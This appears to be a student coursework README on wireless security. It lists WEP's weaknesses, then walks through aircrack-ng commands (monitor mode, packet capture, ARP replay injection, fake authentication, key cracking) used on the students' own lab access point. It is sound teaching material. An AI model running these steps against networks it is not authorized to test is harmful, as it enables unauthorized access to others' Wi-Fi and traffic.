![logo uit](https://github.com/Huy3nMy/Cracking_WEP/tree/master/image/uit-logo.png)

# Project : Cracking WEP

Student 1: **17520771** – Lê Thị Huyền My

Student 2: **17521104** – Lê Thị Huyền Thư

Class: NT330.K21.**ANTN**

Lecturer: Lê Kim Hùng

Courses: Wireless Security

### [I.Introduce](#I.%20Introduce)

1. ### [Wired Equivalent Privacy](#1.%20Wired%20Equivalent%20Privacy%20(WEP))

2. ### [WEP Issues](#2.%20WEP%20Issues)

### [II.Hardware](#II.%20Hardware)

### [III.Cracking WEP](#III.%20Cracking%20WEP)

1. ### [Aircrack-ng](#1.%20Aircrack-ng)

    - [Step 1: Set up wifi modem (low password)](#Step%201:%20Set%20up%20wifi%20modem%20(low%20password))

    - [Step 2: Run monitor mode](#Step%202:%20Run%20monitor%20mode)

    - [Step 3: Capture wireless packet](#Step%203:%20Capture%20wireless%20packet)

    - [Step 4: Cracking WEP](#Step%204:%20Cracking%20WEP)

    - [Step 5: Set up wifi modem (advance password)](#Step%205:%20Set%20up%20wifi%20modem%20(advance%20password))

# I. Introduce

## 1. Wired Equivalent Privacy (WEP)

- WEP is an IEEE 802.11 wireless protocol which provides security algorithms for data confidentiality during wireless transmissions
- WEP uses 24-bit initalization vector (IV) to form stream cipher RC4 for confidentiality and the CRC-32 checksum for intergrity of wireless transmission.

## 2. WEP Issues

- The IV is a 24-bit field is too small and is sent in the cleartext portion of a message
- Identical key streams are produced with the reuse of the same IP for data protection, as the IV is short key streams are repeated within short time
- Lack of centralized key management makes it difficult to change the WEP keys with any regularity
- When there is IV collision, it becomes possible to reconstruct the RC4 keystream based in the IV and the decrypted payload of the packet
- IV is a part of the RC4 encryption key, leads to a analytical attack that recovers the key after intercepting and analyzing a relatively small amount of traffic
- Use of RC4 was designed to be a one-time cipher and not intended for multiples message use
- No defined method for encryption key distribution
- Wirless adapters from the same vendor may all generate the same IV sequence. This enables attackers to determine the key stream and decrypt the ciphertext
- Associate and disassociate messages are not authenticated
- WEP does not provide cryptographic integrity protection. By capturing two packets an attacker can flip a bit in the encrypted stream and modify the checksum so that the paket is accepted
- WEP is based on a password, prone to password cracking attacks
- An attacker can construct a decryption table of the reconstructed key stream and can use it to decrypt the WEP packets in real-time

# II. Hardware

- OS: Kali Linux 2020.1b amb64 in VMware Workstation 15
- AP: Tp-link TL-WN722N (installed drive Rtl8188eus)
- Core: 4 core
- RAM: 2GB
- SCSI: 80GB

# III. Cracking WEP

## 1. Aircrack-ng

### Step 1: Set up wifi modem (low password)

SSID: LETHIHUYEN \*; 128-bit key; low password: 1234567890123

![set up AP with low password](image\set-up-AP-low-pass.png)

### Step 2: Run monitor mode

> #airmon-ng start wlan0

Use the *iwconfig* command to check

![start mode monitor](image\start-mode-monitor.png)

### Step 3: Capture wireless packet

> #airodump-ng wlan0

Airodump-ng provides basic information cables such as: BSSID, beacons, data, channel, maximu speed, encryption algorithm, cipher detected, authentication protocol, ESSID

![ariodump-ng collect base information](image\airodump-ng-collect-information.png)

We need lock the wireless card on the same channel as the AP with the following command: # iwconfig wlan0mon channel 1

The basic injection test provides additional valuable information as well

> #aireplay-ng -9 -e LETHIHUYEN\* -a 72:F4:C2:D1:75:08 wlan0
>
>> -9 means injection test
>>
>> -e LETHIHUYEN\* teddy is the network name (SSID)
>>
>> -a 72:F4:C2:D1:75:08 is MAC address of the access point (BSSID)
>>
>> -wlan0 is the interface name

![injection test](image\injection-test.png)

Capture wireless packet:

> #airodump-ng –bssid 72:F4:C2:D1:75:08 -c 1 -w WEPcrack wlan0
>
>> --bssid is MAC address of the access point
>>
>> -c 1 is AP channel
>>
>> -w WEPcrack: export to WEP crack file

![capture packet](image\capture-file-wepcrack.png)

Generate traffic:

> #aireplay-ng -3 -b 72:F4:C2:D1:75:08 -h E0:62:67:49:0D:74 wlan0
>
>> -3 means standard arp request replay
>>
>> -b 72:F4:C2:D1:75:08 is the access point MAC address
>>
>> -h E0:62:67:49:0D:74 is the source MAC address

![generate traffic](image\generate-traffic-1.png)

> #aireplay-ng -1 0 -e LETHIHUYEN\* -a 72:F4:C2:D1:75:08 -h E0:62:67:49:0D:7A wlan0
>
>> -1 means fake authentication
>>
>> 0 reassociation timing in seconds

![generate traffic](image\generate-traffic-2.png)

### Step 4: Cracking WEP

Use the command #aircrack-ng WEPcrack-01.cap to analyze IVs in the file WEPcrack-01.cap. Aircrack-ng can recover the WEP key once enough encrypted packets have been captured.

> Password: 1234567890123

![find low password in WEPcrack](image\find-low-pass.png)

### Step 5: Set up wifi modem (advance password)

Password: LTH\*=.=@uit10

![set up AP with advance passwork](image\set-up-AP-advance-pass.png)

The number of IVs collected is not enough for analysis, there will be a failure message showing the number of IVs needed.

![fail to find password](image\fail-to-get-pass.png)

We got the password

![find advance password](image\find-advance-pass.png)
